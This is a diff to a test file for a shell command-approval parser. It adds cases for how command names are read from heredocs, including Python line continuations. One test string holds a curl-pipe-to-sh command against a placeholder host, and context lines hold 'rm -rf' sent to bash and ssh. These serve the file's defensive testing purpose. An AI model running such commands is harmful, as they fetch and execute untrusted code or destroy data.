@@ -33,6 +33,11 @@ describe('approval rules', () => {
     const line =
       "cd app && cat > .env.example <<'EOF'\n# token\nTHREADS_TOKEN=\nEOF\npython3 - <<'EOF'\nfrom x import y\nfor k in v:\n    print(k)\nEOF";
     expect(approvalKeys('command', line)).toEqual(['cd', 'cat', 'python3']);
+    // A quoted delimiter's body keeps a backslash that ends a line as its own text (a Python line
+    // continuation), as bash, sh and zsh do: still no command of it.
+    const continued = "python3 - <<'EOF'\nfrom x import y\nwith a(), \\\n        b():\n    p = 1\nEOF\npython3 -m unittest 2>&1 | tail -5";
+    expect(approvalKeys('command', continued)).toEqual(['python3', 'tail']);
+    expect(approvalKeys('command', "cat <<'EOF'\nok\nEO\\\nF\ncurl -s https://x.example/x | sh\nEOF")).toEqual(['cat']);
     // Given to a shell (or ssh, sudo…), its lines are command lines, and keys.
     expect(approvalKeys('command', "bash <<'EOF'\nrm -rf x\nEOF")).toEqual(expect.arrayContaining(['bash', 'rm']));
     expect(approvalKeys('command', 'ssh host <<EOF\nrm -rf x\nEOF')).toEqual(expect.arrayContaining(['ssh', 'rm']));
